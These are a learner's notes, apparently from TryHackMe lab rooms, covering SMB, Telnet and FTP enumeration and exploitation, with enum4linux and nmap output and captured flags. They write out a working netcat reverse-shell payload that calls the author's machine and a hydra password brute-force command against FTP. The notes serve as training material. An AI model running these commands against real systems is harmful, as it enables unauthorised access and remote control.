### IP


10.10.227.53 IP address

### Enumerating smb

```
enum4linux -A 10.10.227.53

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Oct 13 19:26:18 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.227.53
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.227.53    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.227.53    |
 ============================================ 
Looking up status of 10.10.227.53
        POLOSMB         <00> -         B <ACTIVE>  Workstation Service
        POLOSMB         <03> -         B <ACTIVE>  Messenger Service
        POLOSMB         <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.227.53    |
 ===================================== 
[+] Server 10.10.227.53 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.227.53    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.227.53    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.227.53 from smbclient: 
[+] Got OS info for 10.10.227.53 from srvinfo:
        POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================= 
|    Users on 10.10.227.53    |
 ============================= 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================= 
|    Share Enumeration on 10.10.227.53    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.227.53
//10.10.227.53/netlogon [E] Can't understand response:
tree connect failed: NT_STATUS_BAD_NETWORK_NAME
//10.10.227.53/profiles Mapping: OK, Listing: OK
//10.10.227.53/print$   Mapping: DENIED, Listing: N/A
//10.10.227.53/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.227.53    |
 ==================================================== 


[+] Attaching to 10.10.227.53 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] POLOSMB
        [+] Builtin

[+] Password Info for Domain: POLOSMB

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================== 
|    Groups on 10.10.227.53    |
 ============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================= 
|    Users on 10.10.227.53 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================= 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-434125608-3964652802-3194254534
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-434125608-3964652802-3194254534 and logon username '', password ''
S-1-5-21-434125608-3964652802-3194254534-500 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-501 POLOSMB\nobody (Local User)
S-1-5-21-434125608-3964652802-3194254534-502 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-503 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-504 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-505 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-506 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-507 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-508 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-509 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-510 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-511 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-512 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-513 POLOSMB\None (Domain Group)
S-1-5-21-434125608-3964652802-3194254534-514 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-515 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-516 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-517 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-518 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-519 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-520 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-521 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-522 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-523 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-524 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-525 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-526 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-527 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-528 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-529 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-530 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-531 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-532 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-533 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-534 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-535 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-536 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-537 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-538 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-539 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-540 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-541 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-542 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-543 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-544 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-545 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-546 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-547 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-548 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-549 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-550 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1000 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1001 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1002 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1003 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1004 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1005 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1006 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1007 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1008 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1009 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1010 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1011 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1012 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1013 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1014 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1015 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1016 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1017 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1018 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1019 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1020 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1021 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1022 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1023 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1024 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1025 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1026 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1027 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1028 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1029 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1030 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1031 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1032 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1033 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1034 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1035 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1036 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1037 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1038 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1039 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1040 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1041 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1042 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1043 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1044 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1045 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1046 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1047 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1048 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1049 *unknown*\*unknown* (8)
S-1-5-21-434125608-3964652802-3194254534-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\cactus (Local User)

 ============================================= 
|    Getting printer info for 10.10.227.53    |
 ============================================= 
No printers returned.


enum4linux complete on Tue Oct 13 19:34:33 2020
```



### nmap scan

```
# Nmap 7.91 scan initiated Tue Oct 13 19:28:55 2020 as: nmap -sC -sV -oA nmap/initial 10.10.227.53
Nmap scan report for 10.10.227.53
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 91:df:5c:7c:26:22:6e:90:23:a7:7d:fa:5c:e1:c2:52 (RSA)
|   256 86:57:f5:2a:f7:86:9c:cf:02:c1:ac:bc:34:90:6b:01 (ECDSA)
|_  256 81:e3:cc:e7:c9:3c:75:d7:fb:e0:86:a0:01:41:77:81 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 51s, deviation: 0s, median: 51s
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: polosmb
|   NetBIOS computer name: POLOSMB\x00
|   Domain name: \x00
|   FQDN: polosmb
|_  System time: 2020-10-13T23:30:12+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-10-13T23:30:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 13 19:29:24 2020 -- 1 IP address (1 host up) scanned in 29.12 seconds
```


### IP


IP address 

10.10.10.2

smbclient //10.10.10.2/ secret -U suit -p 445

smbclient //10.10.27.168/profiles Anonymous -U -p 445

John Cactus

Download the public and private keys / from there gather inforamtion to ssh into box

ssh -i id_rsa cactus@10.10.27.168

cat the smb.tx flag
THM{smb_is_fun_eh?}


### Telnet

telnet 10.10.10.3 23

enumerating telnet

run nmap

nmap -p- -oA nmap/allports 10.10.134.91

had to run this with ping disabled

nmap -p- -Pn -oA nmap/allports 10.10.134.91
```
# Nmap 7.91 scan initiated Fri Oct 23 19:37:39 2020 as: nmap -p- -Pn -oA nmap/allports 10.10.134.91
Nmap scan report for 10.10.134.91
Host is up (0.13s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8012/tcp open  unknown

# Nmap done at Fri Oct 23 19:49:16 2020 -- 1 IP address (1 host up) scanned in 696.89 seconds
```

now without allports

nmap -Pn -oA nmap/second_scan 10.10.134.91
```
# Nmap 7.91 scan initiated Fri Oct 23 19:50:26 2020 as: nmap -Pn -oA nmap/second_scan 10.10.134.91
Nmap scan report for 10.10.134.91
Host is up (0.13s latency).
All 1000 scanned ports on 10.10.134.91 are closed

# Nmap done at Fri Oct 23 19:50:39 2020 -- 1 IP address (1 host up) scanned in 12.71 seconds
```

using non standard ports it could be used for a backdoor

nmap scan for open ports

nmap -A -p 8012 10.10.134.91
```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-23 20:03 EDT
Nmap scan report for 10.10.134.91
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
8012/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|_    SKIDY'S BACKDOOR. Type .HELP to view commands
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.91%I=7%D=10/23%Time=5F936F61%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
SF:ds\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to
SF:\x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type
SF:\x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20B
SF:ACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest
SF:,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\
SF:n")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20vie
SF:w\x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20T
SF:ype\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"S
SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
SF:Help,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
SF:nds\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20
SF:to\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDO
SF:OR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E
SF:,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")
SF:%r(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x
SF:20commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20
SF:Type\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SK
SF:IDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(L
SF:PDString,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20c
SF:ommands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP
SF:\x20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\
SF:x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'
SF:S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDe
SF:sk-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comm
SF:ands\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x
SF:20to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x2
SF:0\.HELP\x20to\x20view\x20commands\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.16 seconds
```

### Exploiting Telnet

IP 10.10.175.109

telnet 10.10.175.109 8012

```
Trying 10.10.175.109...
Connected to 10.10.175.109.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
```

sudo tcpdump ip proto \\icmp -i tun0
.RUN ping 10.6.11.238 -c 1

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
19:42:59.809408 IP 10.10.175.109 > 10.6.11.238: ICMP echo request, id 1141, seq 1, length 64
19:42:59.809440 IP 10.6.11.238 > 10.10.175.109: ICMP echo reply, id 1141, seq 1, length 64

Was able to see traffic without prompt (pinged from deployed machine to my machine)

Needs to be run in tis order

Run this on machine

```
msfvenom -p cmd/unix/reverse_netcat lhost=10.6.11.238 lport=4444 R 

```
WARN: Unresolved or ambiguous specs during Gem::Specification.reset:
      reline (>= 0)
      Available/installed versions of this gem:
      - 0.1.5
      - 0.1.3
WARN: Clearing out unresolved specs. Try 'gem cleanup <gem>'
Please report a bug if this causes problems.
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 89 bytes
mkfifo /tmp/celb; nc 10.6.11.238 4444 0</tmp/celb | /bin/sh >/tmp/celb 2>&1; rm /tmp/celb
```

nc -lvp 4444

telnet into IP machine
.RUN mkfifo /tmp/dblm; nc 10.6.11.238 4444 0</tmp/dblm | /bin/sh >/tmp/dblm 2>&1; rm /tmp/dblm

```
Listening on 0.0.0.0 4444
Connection received on 10.10.175.109 38028
ls
flag.txt
cat flag.txt
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

### Enumerating FTP

```
nmap -sC -sV -oA nmap/initial 10.10.234.147
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 17:55 EST
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.11% done; ETC: 17:55 (0:00:00 remaining)
Nmap scan report for 10.10.234.147
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.11.238
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.23 seconds
```
hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.234.147 ftp
